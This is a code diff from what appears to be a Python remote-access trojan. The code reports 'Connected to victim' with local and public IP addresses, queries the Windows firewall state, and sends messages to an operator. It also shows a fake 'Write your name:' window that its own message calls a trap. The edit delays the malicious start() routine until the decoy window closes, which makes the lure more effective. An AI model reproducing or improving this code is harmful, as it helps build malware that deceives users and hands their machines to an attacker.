@@ -351,8 +351,7 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                     except: send_msg("Error;")
                 send_msg("click /pass")
                 sleep(5)
-    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(/commands for help).")
-    start()
+    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(Wait for closing trap. write /commands for help).")
     from tkinter import * 
     root = Tk()
     Label(root, text="Write your name:", font=("", 15)).place(x=15, y=50)
@@ -378,6 +377,7 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
     # root.iconphoto(False, picture) 
     root.resizable(False, False)
     root.mainloop()
+    start()
 else:
     root = Tk()
     Label(root, text="Check Your internet connection", font=("", 15)).pack()
